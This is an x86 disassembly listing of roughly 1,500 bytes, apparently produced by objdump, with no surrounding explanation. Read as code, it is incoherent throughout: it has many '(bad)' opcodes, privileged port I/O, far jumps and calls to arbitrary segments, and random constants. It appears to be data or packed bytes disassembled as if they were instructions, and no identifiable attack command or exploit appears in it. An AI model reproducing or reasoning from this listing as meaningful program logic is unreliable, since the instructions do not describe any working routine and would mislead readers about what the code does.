  5227e6:	sub    eax,0x7a5e50f3
  5227eb:	in     al,0xdf
  5227ed:	fidivr DWORD PTR [edx]
  5227ef:	rol    dl,1
  5227f1:	xor    BYTE PTR [eax-0x64ba2783],bh
  5227f7:	push   esi
  5227f8:	push   0x3f
  5227fa:	jle    0x522821
  5227fc:	jae    0x52280e
  5227fe:	jg     0x5227d5
  522800:	mov    esp,0xa434f854
  522805:	popf   
  522806:	aam    0x16
  522808:	repz jne 0x5227e1
  52280b:	push   ebx
  52280c:	and    eax,esi
  52280e:	mov    dh,0x90
  522810:	xchg   esi,eax
  522812:	push   eax
  522813:	mov    esi,0x370cf3e7
  522818:	mov    esp,0x2029c508
  52281d:	and    al,0xa5
  52281f:	in     eax,0x7f
  522821:	sub    dl,BYTE PTR [ecx]
  522823:	out    dx,al
  522824:	fnstenv [edx]
  522826:	retf   
  522827:	cmp    esp,edi
  522829:	sub    DWORD PTR [esi+0x6f],ebp
  52282c:	mov    bl,0x82
  52282e:	(bad)  
  52282f:	aas    
  522830:	adc    ebx,DWORD PTR [ebx-0x21ab6626]
  522836:	xlat   BYTE PTR ds:[ebx]
  522837:	sub    DWORD PTR [eax],edx
  522839:	mov    esp,0x6535581b
  52283e:	mov    bh,0x99
  522840:	in     eax,0xc1
  522842:	ficomp DWORD PTR [edx+0x5a]
  522845:	mov    ds:0xe5f41262,eax
  52284a:	dec    ecx
  52284b:	std    
  52284c:	mov    ch,0xe6
  52284e:	sbb    al,0x4
  522850:	mov    bh,0x8e
  522852:	xor    al,0x34
  522854:	or     dl,BYTE PTR [esp+ebx*8]
  522857:	retf   
  522858:	pop    es
  522859:	xor    esi,edi
  52285b:	inc    eax
  52285c:	pop    ebp
  52285d:	jecxz  0x5228d5
  52285f:	retf   0x24a9
  522862:	pusha  
  522863:	jge    0x5228b4
  522865:	pop    cx
  522867:	mov    ah,0xaf
  522869:	fiadd  WORD PTR [ecx]
  52286b:	xchg   ebx,eax
  52286c:	jo     0x5228a5
  52286e:	stc    
  52286f:	hlt    
  522870:	mov    edx,DWORD PTR [edi-0x80]
  522873:	lea    ebx,[ebx+0x699f470d]
  522879:	pop    es
  52287a:	dec    esi
  52287b:	pop    ebx
  52287c:	ror    BYTE PTR ds:0xe4a862b9,0x9f
  522883:	icebp  
  522884:	pop    ss
  522885:	shr    DWORD PTR [ebx],0x74
  522888:	push   ebp
  522889:	mov    ch,0x90
  52288b:	fstp   st(0)
  52288d:	or     DWORD PTR [edi+0x1ac25219],ecx
  522893:	(bad)
  522896:	push   edx
  522897:	jl     0x5228a4
  522899:	test   al,dl
  52289b:	or     BYTE PTR [ecx-0xc253b49],ah
  5228a1:	test   DWORD PTR ds:0x3e668546,0x8271d38
  5228ab:	mov    edi,0xadc59447
  5228b0:	scas   al,BYTE PTR es:[edi]
  5228b1:	sub    edi,ecx
  5228b3:	leave  
  5228b4:	push   0x6
  5228b6:	pop    eax
  5228b7:	fsubr  DWORD PTR [ecx+0x2b18706]
  5228bd:	es and al,bh
  5228c0:	sbb    ah,BYTE PTR [esi+0xef72a68]
  5228c6:	dec    ebp
  5228c7:	dec    ecx
  5228c8:	jg     0x5228b0
  5228ca:	int    0x5
  5228cc:	inc    esp
  5228cd:	imul   esi,DWORD PTR [ecx+0x2e],0x2f95f874
  5228d4:	and    BYTE PTR [eax-0xb2f626e],ch
  5228da:	rcr    esp,1
  5228dc:	xor    eax,0xdc057e68
  5228e1:	call   FWORD PTR [ebx+0x2bada8c4]
  5228e7:	test   ah,bl
  5228e9:	push   0x3d
  5228eb:	out    0x67,al
  5228ed:	outs   dx,BYTE PTR ds:[esi]
  5228ee:	es ds jmp 0x52287e
  5228f2:	je     0x522894
  5228f4:	dec    ebx
  5228f5:	ja     0x52292e
  5228f7:	push   ebx
  5228f8:	fsub   DWORD PTR [ebp-0xb2f8999]
  5228fe:	xchg   edx,eax
  5228ff:	arpl   WORD PTR [ebp+ebx*8+0x1c9766ea],di
  522906:	xchg   esp,eax
  522907:	sub    esp,DWORD PTR ds:0x4f531f0b
  52290d:	repnz add BYTE PTR [eax+0x17],dl
  522911:	mov    bl,0xeb
  522913:	jne    0x522941
  522915:	aaa    
  522916:	dec    edi
  522917:	push   ecx
  522918:	nop
  522919:	adc    bl,BYTE PTR [ebx]
  52291b:	fwait
  52291c:	in     al,0x7a
  52291e:	add    al,0xea
  522920:	outs   dx,DWORD PTR ds:[esi]
  522921:	cwde   
  522922:	leave  
  522923:	inc    DWORD PTR ds:0x31cc2569
  522929:	adc    BYTE PTR [ecx],bh
  52292b:	aam    0x20
  52292d:	inc    esp
  52292e:	jb     0x52293a
  522930:	fbstp  TBYTE PTR [edi+ebp*1+0x7c07bc43]
  522937:	mov    ds:0x6383aa8e,al
  52293c:	imul   ebx,DWORD PTR [esi+eiz*1+0x1fdf71bf],0xe61491d6
  522947:	stos   BYTE PTR es:[edi],al
  522948:	dec    DWORD PTR [edx]
  52294a:	out    dx,al
  52294b:	jecxz  0x5228dc
  52294d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52294e:	mov    edx,0x9b7c7095
  522953:	call   edi
  522955:	test   eax,0x6f7c53d7
  52295a:	(bad)  
  52295b:	cs xchg ebx,eax
  52295d:	and    bl,al
  52295f:	mov    ebp,0x4679b26c
  522964:	mov    ah,0xe9
  522966:	cmp    DWORD PTR [edi+0x1c],edx
  522969:	loopne 0x522917
  52296b:	xchg   ebp,eax
  52296c:	dec    esp
  52296d:	jae    0x522934
  52296f:	adc    edx,DWORD PTR [ecx]
  522971:	add    DWORD PTR [ebp-0xe9b222e],edi
  522977:	mov    ds:0x3bff1f3b,eax
  52297c:	aad    0x78
  52297e:	test   BYTE PTR [edx+ebp*2-0x3e],bl
  522982:	fnstsw WORD PTR [eax-0x70]
  522985:	sbb    eax,DWORD PTR ds:0xa50a62e7
  52298c:	fs gs xchg ecx,eax
  52298f:	pop    ebx
  522990:	je     0x522993
  522992:	jecxz  0x5229d1
  522994:	test   DWORD PTR [esi-0x46d9774b],ebp
  52299a:	sbb    DWORD PTR [ecx-0x24614def],esi
  5229a0:	cs retf 
  5229a2:	pop    esp
  5229a3:	je     0x522a01
  5229a5:	data16 fcomp DWORD PTR [ecx-0x52]
  5229a9:	mov    eax,ds:0x6904e597
  5229ae:	out    dx,al
  5229af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5229b0:	pop    esi
  5229b1:	pop    ds
  5229b2:	inc    edi
  5229b3:	mov    DWORD PTR [ebp-0x270d907b],esp
  5229b9:	sub    al,0x76
  5229bb:	pusha  
  5229bc:	stos   DWORD PTR es:[edi],eax
  5229bd:	ret    
  5229be:	pop    es
  5229bf:	shr    BYTE PTR [eax-0x3d],0x10
  5229c3:	push   ds
  5229c4:	jmp    0xf6a8:0x1ef233b5
  5229cb:	dec    ebp
  5229cc:	test   BYTE PTR [ebp+0x5c],ch
  5229cf:	lock into 
  5229d1:	test   dl,ah
  5229d3:	jge    0x5229cb
  5229d5:	sub    eax,0xb86fda2c
  5229da:	idiv   DWORD PTR [esi]
  5229dc:	cmp    eax,0x85f73df4
  5229e1:	mov    dl,0x30
  5229e3:	fiadd  WORD PTR [ebp+0x3f]
  5229e6:	fbld   TBYTE PTR [eax+0x74020abb]
  5229ec:	mov    ah,0x3b
  5229ee:	push   esp
  5229ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5229f0:	psubsw mm3,mm2
  5229f3:	xchg   edx,eax
  5229f4:	inc    edi
  5229f5:	mov    esp,0x1f741d06
  5229fa:	lods   al,BYTE PTR ds:[esi]
  5229fb:	mov    eax,0xcf660d65
  522a00:	cmp    eax,0x6efcd9c6
  522a05:	icebp  
  522a06:	and    al,0x53
  522a08:	mov    ebp,0x61576045
  522a0d:	cmp    eax,0x4fd1b76b
  522a12:	adc    ah,0x99
  522a15:	jmp    0x4fbc:0x1808826f
  522a1c:	scas   al,BYTE PTR es:[edi]
  522a1d:	and    al,0x4d
  522a1f:	shl    dh,cl
  522a21:	aaa    
  522a22:	out    0x5f,eax
  522a24:	bound  esi,QWORD PTR ss:[ebx+0x759d701c]
  522a2b:	cmp    BYTE PTR [edx+ebp*8+0x1fef1ee6],dh
  522a32:	arpl   WORD PTR [eax+ebp*4+0x36dfddb8],sp
  522a39:	adc    al,0x3e
  522a3b:	dec    edx
  522a3c:	mov    ?,WORD PTR [ecx+0x18]
  522a3f:	gs leave 
  522a41:	adc    bh,BYTE PTR [esi+ebp*4]
  522a44:	mov    bh,0xfd
  522a46:	mov    ah,0x38
  522a48:	xor    ebx,DWORD PTR [ecx+0x402ab9db]
  522a4e:	ss xchg esi,eax
  522a50:	or     esi,edx
  522a52:	daa    
  522a53:	jne    0x5229dd
  522a55:	jnp    0x522a47
  522a57:	add    BYTE PTR [esi+ebp*4+0x5047089a],dl
  522a5e:	sbb    eax,DWORD PTR [ecx+edi*2]
  522a61:	cdq    
  522a62:	int    0x8e
  522a64:	imul   ebp,edx,0x614185cf
  522a6a:	sar    BYTE PTR [ebp+0x29],cl
  522a6d:	sub    edx,ebx
  522a6f:	mov    ds:0xd57122d4,al
  522a74:	in     al,0x3b
  522a76:	clc    
  522a77:	dec    ebp
  522a78:	jbe    0x522a1c
  522a7a:	lahf   
  522a7b:	sub    al,0xe6
  522a7d:	sti    
  522a7e:	jge    0x522af6
  522a80:	mov    ecx,0x98ea7a81
  522a85:	scas   eax,DWORD PTR es:[edi]
  522a86:	sub    bl,BYTE PTR [edx+0x5f54b7f2]
  522a8c:	fmul   QWORD PTR [ecx-0x6b]
  522a8f:	push   esp
  522a90:	ins    BYTE PTR es:[edi],dx
  522a91:	or     al,0xce
  522a93:	mov    bl,0xfc
  522a95:	(bad)  
  522a96:	ins    BYTE PTR es:[edi],dx
  522a97:	mov    al,cl
  522a99:	fwait
  522a9a:	stos   BYTE PTR es:[edi],al
  522a9b:	aad    0x27
  522a9d:	mov    ch,al
  522a9f:	dec    ebp
  522aa0:	js     0x522ac6
  522aa2:	ins    BYTE PTR es:[edi],dx
  522aa3:	mov    eax,ds:0xbb9c4a52
  522aa8:	out    0xc2,eax
  522aaa:	mov    eax,0x55bb2aa6
  522aaf:	jae    0x522a8f
  522ab1:	xor    al,0xf1
  522ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  522ab4:	inc    eax
  522ab5:	fiadd  WORD PTR [ecx+0x4ad362dd]
  522abb:	jns    0x522a83
  522abd:	pop    esp
  522abe:	push   edi
  522abf:	(bad)  
  522ac0:	int    0x21
  522ac2:	mov    edi,0xa6acddd8
  522ac7:	mov    ah,0x82
  522ac9:	mov    eax,0x3e66a63f
  522ace:	mov    ecx,0xf0dc3f3
  522ad3:	push   edx
  522ad4:	ss push ss
  522ad6:	std    
  522ad7:	cmp    esi,DWORD PTR [esi]
  522ad9:	add    dh,bh
  522adb:	mov    ah,0x26
  522add:	sbb    ebx,DWORD PTR [ebx+edx*8]
  522ae0:	popf   
  522ae1:	pop    edx
  522ae2:	push   ds
  522ae3:	jnp    0x522b01
  522ae5:	das    
  522ae6:	or     eax,0xd627ed14
  522aeb:	loope  0x522a73
  522aed:	mov    dh,0x32
  522aef:	lahf   
  522af0:	test   al,0x91
  522af2:	mov    cl,BYTE PTR [ebx-0x1b897b2d]
  522af8:	je     0x522b77
  522afa:	das    
  522afb:	imul   ebx,DWORD PTR [ebx-0x7f],0xa8304972
  522b02:	push   0x168a622f
  522b07:	xchg   DWORD PTR [ebx+0x2f325a],eax
  522b0d:	push   esi
  522b0e:	out    dx,al
  522b0f:	jbe    0x522b09
  522b11:	add    esp,edi
  522b13:	shr    BYTE PTR [eax+0x74e1afaf],cl
  522b19:	test   eax,0x6b04df75
  522b1e:	in     al,dx
  522b1f:	or     cl,BYTE PTR [edx+0x223d3ff8]
  522b25:	(bad)  
  522b26:	xchg   ecx,eax
  522b27:	lea    ecx,[eax+0x4e54136a]
  522b2d:	jg     0x522ad5
  522b2f:	xlat   BYTE PTR ds:[ebx]
  522b30:	popf   
  522b31:	call   0x25f1:0x2af5009f
  522b38:	lahf   
  522b39:	cmp    al,0x82
  522b3b:	push   ebp
  522b3c:	mov    eax,ds:0xdf42ab46
  522b41:	mov    eax,ds:0x45c946c8
  522b46:	push   eax
  522b47:	adc    al,0x79
  522b49:	and    ecx,ebx
  522b4b:	lea    edx,ds:0x17c283c1
  522b51:	mov    dl,0xfa
  522b53:	retf   0x6924
  522b56:	aam    0xe2
  522b58:	aas    
  522b59:	test   eax,0xa63793db
  522b5e:	inc    edi
  522b5f:	jnp    0x522b8a
  522b61:	jns    0x522b5e
  522b63:	xchg   DWORD PTR ds:0x667e8540,esi
  522b69:	jb     0x522bda
  522b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  522b6c:	scas   eax,DWORD PTR es:[edi]
  522b6d:	inc    edi
  522b6e:	mov    ds:0x67dbe31a,al
  522b73:	mov    ebp,0x5d425d76
  522b78:	in     eax,dx
  522b79:	sahf   
  522b7a:	xor    ah,BYTE PTR [ebx-0x5f43042f]
  522b80:	adc    eax,0xb0749eb0
  522b85:	mov    dl,0x76
  522b87:	pop    edi
  522b88:	inc    eax
  522b89:	fwait
  522b8a:	pop    edx
  522b8b:	aam    0xd0
  522b8d:	jmp    0x522bd6
  522b8f:	out    0x5e,al
  522b91:	rol    DWORD PTR [esi],0x19
  522b94:	xchg   BYTE PTR [ebp+0x13d813eb],cl
  522b9a:	loope  0x522bfa
  522b9c:	mov    ah,0x14
  522b9e:	or     ch,bl
  522ba0:	and    edi,DWORD PTR [edi+0x32]
  522ba3:	popf   
  522ba4:	mov    ds:0xfb4ea6f,al
  522ba9:	fimul  DWORD PTR [edi-0x1f]
  522bac:	test   dh,ah
  522bae:	adc    al,0xc7
  522bb0:	pop    ebp
  522bb1:	xlat   BYTE PTR ds:[ebx]
  522bb2:	inc    edi
  522bb3:	sar    DWORD PTR [ebp-0x5cbf8381],cl
  522bb9:	mov    ecx,0x9b3b060f
  522bbe:	jmp    0xca8d106
  522bc3:	ret    0x73d9
  522bc6:	ret    
  522bc7:	or     al,0x50
  522bc9:	sti    
  522bca:	fisubr DWORD PTR [bp+si-0x3b1d]
  522bcf:	mov    BYTE PTR [ecx+0xe],cl
  522bd2:	adc    eax,DWORD PTR [esi]
  522bd4:	adc    DWORD PTR [ebp-0x7c2cd1df],ecx
  522bda:	loop   0x522bf9
  522bdc:	sahf   
  522bdd:	imul   eax,DWORD PTR [ebx],0xf578eea8
  522be3:	add    BYTE PTR [edi+0x68cc884],0x61
  522bea:	inc    esp
  522beb:	xchg   edx,eax
  522bec:	bound  ebx,QWORD PTR [ecx+0xb6b70e9]
  522bf2:	sbb    bl,BYTE PTR [ecx+0x1d8654a7]
  522bf8:	sbb    DWORD PTR [edx-0x1d495711],0x42052b3a
  522c02:	aas    
  522c03:	jno    0x522bff
  522c05:	data16 mov es,WORD PTR [edi]
  522c08:	fld    DWORD PTR [edx]
  522c0a:	push   edi
  522c0b:	out    dx,al
  522c0c:	vmwrite edx,DWORD PTR [edi+ebx*8]
  522c10:	nop
  522c11:	lahf   
  522c12:	rcr    DWORD PTR [eax+0x76],0x96
  522c16:	cli    
  522c17:	outs   dx,BYTE PTR ds:[esi]
  522c18:	(bad)  
  522c19:	push   ebx
  522c1a:	jnp    0x522bbe
  522c1c:	xchg   esi,eax
  522c1d:	cmp    ebx,ebx
  522c1f:	cld    
  522c20:	cdq    
  522c21:	retf   
  522c22:	ins    DWORD PTR es:[edi],dx
  522c23:	ret    0x50f
  522c26:	dec    esi
  522c27:	call   0x93a4:0xf0b19f46
  522c2e:	lahf   
  522c2f:	adc    ch,BYTE PTR [edx+0x1a]
  522c32:	inc    ecx
  522c33:	pop    ebx
  522c34:	in     al,0xf
  522c36:	sub    al,0xa0
  522c38:	mov    esp,ecx
  522c3a:	loopne 0x522c4b
  522c3c:	mov    bl,0xb0
  522c3e:	call   0x6a4a8413
  522c43:	and    cl,bl
  522c45:	les    esp,FWORD PTR [edx-0x44]
  522c48:	dec    ebx
  522c49:	fstp   DWORD PTR ss:[esi-0x7a]
  522c4d:	imul   esp,ebp,0x33e4d79e
  522c53:	aam    0xff
  522c55:	fidivr DWORD PTR [ecx]
  522c57:	out    dx,al
  522c58:	xor    DWORD PTR [edi],esp
  522c5a:	popf   
  522c5b:	cmp    eax,0x5edb18b3
  522c60:	icebp  
  522c61:	cmp    DWORD PTR [ebp-0x1f],0x2
  522c65:	push   cs
  522c66:	mov    dl,0xbb
  522c68:	outs   dx,BYTE PTR ds:[esi]
  522c69:	mov    ds:0xc714f16,al
  522c6e:	cld    
  522c6f:	sbb    BYTE PTR [ebx-0x32292de1],ah
  522c75:	scas   al,BYTE PTR es:[edi]
  522c76:	std    
  522c77:	xchg   edi,eax
  522c78:	ss cmp eax,0x773c969e
  522c7e:	adc    DWORD PTR [ebp-0xd],eax
  522c81:	ret    
  522c82:	mov    ah,0xe2
  522c84:	jmp    0x522c9f
  522c86:	sub    DWORD PTR [eax+0x3f],esp
  522c89:	push   0x60
  522c8b:	jns    0x522c8e
  522c8d:	pop    ecx
  522c8e:	(bad)  
  522c8f:	pushf  
  522c90:	pop    es
  522c91:	mov    eax,ds:0x90fb3aaf
  522c96:	or     dh,al
  522c98:	jae    0x522c39
  522c9a:	jo     0x522c49
  522c9c:	in     al,0x36
  522c9e:	sar    DWORD PTR [edx-0xd],1
  522ca1:	push   cs
  522ca2:	cmp    BYTE PTR [ecx-0x67cd1aee],0x2d
  522ca9:	test   dh,0x7a
  522cac:	add    DWORD PTR [edi+0x27d343e0],esp
  522cb2:	retf   0x7267
  522cb5:	lahf   
  522cb6:	dec    ebp
  522cb7:	addr16 jo 0x522c3f
  522cba:	inc    esp
  522cbb:	dec    edx
  522cbc:	inc    esp
  522cbd:	jbe    0x522c70
  522cbf:	scas   al,BYTE PTR es:[edi]
  522cc0:	add    eax,0xd82006f0
  522cc5:	ror    edi,cl
  522cc7:	(bad)  
  522cc8:	xchg   esp,eax
  522cc9:	pop    ss
  522cca:	adc    ch,al
  522ccc:	cwde   
  522ccd:	lahf   
  522cce:	pop    eax
  522ccf:	sub    cl,BYTE PTR [ebx]
  522cd1:	fstp   QWORD PTR cs:[ecx-0x23]
  522cd5:	sbb    eax,0x63242a5c
  522cda:	xor    al,0xc5
  522cdc:	jbe    0x522cd6
  522cde:	push   0xd
  522ce0:	int    0x20
  522ce2:	pop    ebp
  522ce3:	ror    edx,0xfb
  522ce6:	es push ds
  522ce8:	mov    ds:0x7669b69a,al
  522ced:	(bad)  
  522cef:	hlt    
  522cf0:	pop    esi
  522cf1:	or     DWORD PTR [ecx-0x29a27648],ebx
  522cf7:	das    
  522cf8:	mov    cl,0x60
  522cfa:	fadd   DWORD PTR [ecx+0x56]
  522cfd:	out    0xb9,eax
  522cff:	cmp    dl,BYTE PTR [esi+0x56f1ed41]
  522d05:	mov    ah,0xcb
  522d07:	test   al,0xb8
  522d09:	sub    BYTE PTR [ecx-0x31597d0],0x2c
  522d10:	arpl   WORD PTR [edi+edi*8],cx
  522d13:	sti    
  522d14:	jp     0x522cd9
  522d16:	cmp    al,0x8a
  522d18:	sar    DWORD PTR [eax],0x76
  522d1b:	inc    esp
  522d1c:	pop    ds
  522d1d:	repnz xor BYTE PTR [ecx-0x51702216],ch
  522d24:	or     eax,0x97e7c0bd
  522d29:	mov    ebp,0x9bcc3e60
  522d2e:	out    dx,eax
  522d2f:	xchg   edx,eax
  522d30:	xchg   ecx,eax
  522d31:	jmp    0xc57f4f40
  522d36:	test   al,0x86
  522d38:	jb     0x522ccc
  522d3a:	xchg   ebp,eax
  522d3b:	mov    ch,0x8e
  522d3d:	add    esp,DWORD PTR [esi-0x2c]
  522d40:	pop    ss
  522d41:	mov    DWORD PTR [ebx+0x1c26ed89],ebp
  522d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  522d48:	cwde   
  522d49:	sbb    cl,BYTE PTR [edi+0x2f]
  522d4c:	push   ecx
  522d4d:	je     0x522d77
  522d4f:	popa   
  522d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  522d51:	mov    ds:0x28da6bc7,al
  522d56:	loope  0x522dd4
  522d58:	mov    ebx,DWORD PTR [ecx+0x1ba130e1]
  522d5e:	sub    eax,0x1ded9e32
  522d63:	pop    ss
  522d64:	in     al,0xf2
  522d66:	mov    al,0xfb
  522d68:	jbe    0x522d5a
  522d6a:	sahf   
  522d6b:	mov    al,ds:0x4d673c32
  522d70:	arpl   sp,si
  522d72:	ds idiv edx
  522d75:	adc    eax,0xac8dc1f4
  522d7a:	arpl   WORD PTR [edx],si
  522d7c:	icebp  
  522d7d:	fstp   DWORD PTR [ecx]
  522d7f:	xor    ch,dl
  522d81:	ins    DWORD PTR es:[edi],dx
  522d82:	test   BYTE PTR [ecx-0x2155c70c],al
  522d88:	jbe    0x522d6e
  522d8a:	clc    
  522d8b:	pop    edx
  522d8c:	inc    edi
  522d8d:	cli    
  522d8e:	inc    ebp
  522d8f:	(bad)  
  522d90:	jno    0x522d9a
  522d92:	test   ebx,ebp
  522d94:	hlt    
  522d95:	cs pusha 
  522d97:	gs jg  0x522d1a
  522d9a:	outs   dx,DWORD PTR ds:[esi]
  522d9b:	lods   eax,DWORD PTR ds:[esi]
  522d9c:	pop    es
  522d9d:	(bad)  
  522d9e:	push   edx
  522d9f:	mov    ds:0x8817931a,eax
  522da4:	cmp    ebp,DWORD PTR [eax]
  522da6:	mov    eax,ss:0x4b56cbf3
  522dac:	scas   eax,DWORD PTR es:[edi]
  522dad:	mov    ch,0x88
  522daf:	fxch   st(6)
  522db1:	pop    ds
  522db2:	sbb    eax,0x931911f2
  522db7:	adc    eax,0xa532f2e
  522dbc:	sub    ch,BYTE PTR [ebx+0x79c16bb]
  522dc2:	cli    
  522dc3:	xor    BYTE PTR [eax+0x62],bl
  522dc6:	js     0x522df1
  522dc8:	jg     0x522e09
  522dca:	push   ds
  522dcb:	rcl    BYTE PTR [ebx-0x759ddbee],cl
  522dd1:	push   ebx
  522dd2:	sub    DWORD PTR [edi-0x350bffcc],ebx
  522dd8:	cmp    edx,ebx
  522dda:	adc    dh,dl
  522ddc:	jbe    0x522dd5
  522dde:	fs adc eax,0x3880e597
  522de4:	and    edx,DWORD PTR [ebp+0x23e2cd20]
  522dea:	push   ds
  522deb:	mov    ds:0xb960e77c,eax
  522df0:	xor    ebp,edi
  522df2:	dec    ebp
  522df3:	stos   BYTE PTR es:[edi],al
  522df4:	mov    bh,0x2c
  522df6:	dec    eax
  522df7:	inc    esp
  522df8:	push   edi
  522df9:	dec    eax
  522dfa:	and    ecx,esi
  522dfc:	aad    0x6e
  522dfe:	fimul  DWORD PTR [eax-0x3d]
  522e01:	xchg   edi,eax
  522e02:	mov    dl,0xbb
  522e04:	mov    cl,0x63
  522e06:	mov    edx,0x99e4340a
  522e0b:	popf   
  522e0c:	leave  
  522e0d:	jae    0x522dc0
  522e0f:	leave  
  522e10:	test   eax,0xdae3eca
  522e15:	ins    DWORD PTR es:[edi],dx
  522e16:	pop    ebx
  522e17:	pop    ecx
  522e18:	fistp  WORD PTR [esi+edx*2+0x7e2a2485]
  522e1f:	dec    ebp
  522e20:	mov    ds:0xf47330a1,al
  522e25:	fadd   DWORD PTR [esi-0x4991206c]
  522e2b:	or     eax,0x18cc4b4
  522e30:	xchg   BYTE PTR [ebx-0x31],dh
  522e33:	sbb    al,0x97
  522e35:	std    
  522e36:	out    0x6f,eax
  522e38:	fcom   QWORD PTR [ecx-0x26]
  522e3b:	inc    ecx
  522e3c:	(bad)  
  522e3d:	dec    esi
  522e3e:	jecxz  0x522e40
  522e40:	pop    ecx
  522e41:	lods   eax,DWORD PTR ds:[esi]
  522e42:	mov    edx,0xd23c31dd
  522e48:	jmp    0xac21:0x296ce74a
  522e4f:	shl    BYTE PTR [edx+0xd],0xdf
  522e53:	dec    esi
  522e54:	fsubr  QWORD PTR ss:[ebx+0x9]
  522e58:	shr    DWORD PTR [esi+0x4],1
  522e5b:	lock and edi,DWORD PTR [edi+eiz*2-0x335772a0]
  522e63:	pop    esi
  522e64:	mov    ds,WORD PTR [edi-0x54127dc9]
  522e6a:	pop    ebx
  522e6b:	inc    eax
  522e6c:	mov    esi,0xb3fdc8f2
  522e71:	mov    esi,0x4a3a38f4
  522e76:	ins    DWORD PTR es:[edi],dx
  522e77:	stos   BYTE PTR es:[edi],al
  522e78:	mov    dh,0xac
  522e7a:	les    esi,FWORD PTR [ebp+0x6f]
  522e7d:	int3   
  522e7e:	test   esi,edi
  522e80:	xchg   DWORD PTR [edi-0x47],edi
  522e83:	sub    al,BYTE PTR [ebp-0x467159b8]
  522e89:	les    edx,FWORD PTR [ebp-0x7f07624f]
  522e8f:	mov    edi,0x716029e2
  522e94:	adc    ch,bl
  522e96:	ret    0x9095
  522e99:	aad    0xa9
  522e9b:	cwde   
  522e9c:	ficom  WORD PTR [ebp+0x6ceb1f1d]
  522ea2:	push   0x80e22f4c
  522ea7:	enter  0x6a58,0xf
  522eab:	sbb    al,0x74
  522ead:	push   0xffffffaf
  522eaf:	cld    
  522eb0:	test   al,0x42
  522eb2:	push   0x50
  522eb4:	jae    0x522f29
  522eb6:	sbb    eax,0x1efe2745
  522ebb:	js     0x522eee
  522ebd:	pop    ds
  522ebe:	and    DWORD PTR [edi-0x25],edi
  522ec1:	jmp    0x522f2b
  522ec3:	xor    cl,BYTE PTR [ebx]
  522ec5:	xor    ebx,DWORD PTR [eax]
  522ec7:	popf   
  522ec8:	mov    ebp,0x5a34b0d2
  522ecd:	outs   dx,DWORD PTR ds:[esi]
  522ece:	mov    edi,0x3cf4579b
  522ed3:	cmp    al,0xb2
  522ed5:	lods   eax,DWORD PTR ds:[esi]
  522ed6:	mov    ds:0x3f482b45,eax
  522edb:	or     eax,0x1154e4e8
  522ee0:	call   0xa096:0xb97a5de8
  522ee7:	jns    0x522f34
  522ee9:	adc    eax,0xcd7e0985
  522eee:	sub    al,0xce
  522ef0:	imul   edi,DWORD PTR [ecx+eax*4+0x50],0xffffffc4
  522ef5:	pop    ebx
  522ef6:	sbb    al,0x77
  522ef8:	fbld   TBYTE PTR [ebx]
  522efa:	stos   BYTE PTR es:[edi],al
  522efb:	xchg   edi,eax
  522efc:	dec    ebx
  522efd:	aas    
  522efe:	push   esi
  522eff:	adc    al,0x32
  522f01:	out    dx,al
  522f02:	jne    0x522eee
  522f04:	mov    ebp,0x41db7ca3
  522f09:	jb     0x522e98
  522f0b:	adc    BYTE PTR [ebx],ch
  522f0d:	fst    QWORD PTR [edx+0x36]
  522f10:	fld    DWORD PTR [esi]
  522f12:	cwde   
  522f13:	push   ss
  522f14:	add    al,0x60
  522f16:	scas   eax,DWORD PTR es:[edi]
  522f17:	inc    ebp
  522f18:	inc    ebx
  522f19:	adc    ah,BYTE PTR [eax-0x16a4712c]
  522f1f:	call   0x24cb61aa
  522f24:	lock (bad) 
  522f26:	adc    cl,BYTE PTR [ebx+0x228ac059]
  522f2c:	in     eax,0x5
  522f2e:	inc    ebp
  522f2f:	pop    ss
  522f30:	call   0xb67b1404
  522f35:	mov    BYTE PTR [ebx+ebx*4-0x5e],bh
  522f39:	jb     0x522f69
  522f3b:	adc    DWORD PTR ss:[edx+esi*8-0x18],esp
  522f40:	inc    esi
  522f41:	shl    BYTE PTR [ebx+edx*8],0x2d
  522f45:	sub    edi,ebx
  522f47:	jg     0x522f71
  522f49:	loopne 0x522fa1
  522f4b:	jbe    0x522fb5
  522f4d:	adc    bh,BYTE PTR [eax]
  522f4f:	sbb    eax,0xd65a8ad0
  522f54:	idiv   BYTE PTR [edi+edx*8+0x43]
  522f58:	sbb    dh,BYTE PTR [ecx+0x6f]
  522f5b:	inc    esp
  522f5c:	or     bh,BYTE PTR [eax+0x31c855f8]
  522f62:	pop    ebx
  522f63:	js     0x522fb5
  522f65:	ss dec ebx
  522f67:	jnp    0x522f04
  522f69:	out    dx,eax
  522f6a:	dec    edx
  522f6b:	je     0x522f94
  522f6d:	add    dh,bl
  522f6f:	repnz xor cl,0x1a
  522f73:	and    edi,0x286690bb
  522f79:	sub    al,0x4f
  522f7b:	stos   DWORD PTR es:[edi],eax
  522f7c:	inc    esp
  522f7d:	fsubr  QWORD PTR [ebx+eiz*1]
  522f80:	fwait
  522f81:	jl     0x522f55
  522f83:	popa   
  522f84:	xor    DWORD PTR [ebp+0x2e],0x77
  522f88:	inc    eax
  522f89:	jo     0x522f26
  522f8b:	shl    DWORD PTR [esi],cl
  522f8d:	push   es
  522f8e:	dec    esi
  522f8f:	jp     0x523001
  522f91:	outs   dx,DWORD PTR ds:[esi]
  522f92:	inc    edx
  522f93:	xchg   BYTE PTR [ebp+0x7fd1a682],ch
  522f99:	ret    0xc242
  522f9c:	add    ch,dl
  522f9e:	rcr    BYTE PTR [edx-0x6fd00266],1
  522fa4:	inc    edx
  522fa5:	mov    al,0x4c
  522fa7:	xor    eax,0xbb5d4af4
  522fac:	pushf  
  522fad:	xchg   edx,ecx
  522faf:	lahf   
  522fb0:	and    edx,eax
  522fb2:	sub    al,0x38
  522fb4:	mov    ah,0x96
  522fb6:	jo     0x522feb
  522fb8:	fsubr  st(1),st
  522fba:	retf   0xccd8
  522fbd:	mov    bl,0x4e
  522fbf:	pop    ecx
  522fc0:	xlat   BYTE PTR fs:[ebx]
  522fc2:	adc    eax,eax
  522fc4:	dec    eax
  522fc5:	mov    ecx,0xb3cb4e95
  522fca:	cmp    al,0xa7
  522fcc:	mov    esi,0x5015d6b8
  522fd1:	or     BYTE PTR [edi+edi*4+0x6b],ch
  522fd5:	popa   
  522fd6:	mov    ds:0x229a2b03,eax
  522fdb:	and    esi,edi
